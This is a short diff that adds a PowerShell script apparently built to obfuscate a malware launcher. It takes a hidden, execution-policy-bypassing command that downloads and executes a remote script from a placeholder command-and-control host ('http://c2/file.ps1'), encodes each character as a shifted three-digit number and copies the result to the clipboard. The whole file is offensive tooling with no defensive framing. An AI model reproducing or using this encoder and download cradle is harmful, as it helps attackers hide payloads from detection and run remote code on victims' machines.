@@ -1,0 +1,22 @@
+$string = "powershell -exec bypass -nop -w hidden -c iex(new-object net.webclient).downloadstring('http://c2/file.ps1')" 
+ 
+[string]$output = "" 
+ 
+$string.ToCharArray() | %{ 
+    [string]$thischar = [byte][char]$_ + 17 
+    if($thischar.Length -eq 1) 
+    { 
+        $thischar = [string]"00" + $thischar 
+        $output += $thischar 
+    } 
+    elseif($thischar.Length -eq 2) 
+    { 
+        $thischar = [string]"0" + $thischar 
+        $output += $thischar 
+    } 
+    elseif($thischar.Length -eq 3) 
+    { 
+        $output += $thischar 
+    } 
+} 
+$output | clip 
